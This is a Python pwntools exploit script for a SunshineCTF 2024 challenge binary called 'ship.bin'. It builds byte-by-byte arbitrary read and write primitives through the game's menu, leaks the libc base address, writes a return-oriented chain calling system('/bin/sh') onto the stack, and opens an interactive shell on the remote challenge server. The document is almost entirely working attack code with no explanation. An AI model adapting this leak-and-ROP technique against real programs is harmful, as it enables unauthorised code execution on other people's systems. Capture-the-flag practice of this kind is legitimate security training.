#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ship.bin_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '2024.sunshinectf.games', 24003

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# breakrva 0x14af

breakrva 0x1752
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec ship.bin
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def AAR64(off) -> int:
    hex_str = ''
    off = off - 1

    for i in range(8, 0, -1):
        io.sendlineafter(b'>>>', b'30')
        io.sendlineafter(b'>>>', f'{off+i}'.encode())
        io.sendlineafter(b'>>>', b'A')
        io.recvuntil(b'from ')
        hex_str += io.recvuntil(b'to', drop=True).strip().decode()

    return int(hex_str, 16)

def AAW64(off, val):
    log.info(f'writing {hex(val)} to {off}')
    val = p64(val)

    for i in range(8):
        log.info(f'writing {hex(val[i])} to pos {off+i}')
        io.sendlineafter(b'>>>', b'30')
        io.sendlineafter(b'>>>', f'{off+i}'.encode())
        io.sendlineafter(b'>>>', val[i:i+1])

def end_game():
    for i in range(16):
        for j in range(16):
            io.sendlineafter(b'>>>', f'{i}'.encode())
            io.sendlineafter(b'>>>', f'{j}'.encode())
            io.sendlineafter(b'>>>', b'T')
            io.recvlines(3)

            stuff = io.recvline().strip()
            if b'wins' in stuff or b'Victory' in stuff:
                log.info("returned")
                return

def exploit():
    global io
    io = initialize()

    libc.address = AAR64(56) - 0x2a1ca
    rop = ROP(libc)
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    RET = rop.find_gadget(['ret'])[0]

    AAW64(56, POP_RDI)
    AAW64(56+8, next(libc.search(b'/bin/sh\x00')))
    AAW64(56+16, RET)
    AAW64(56+24, libc.sym['system'])
    end_game()

    log.info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
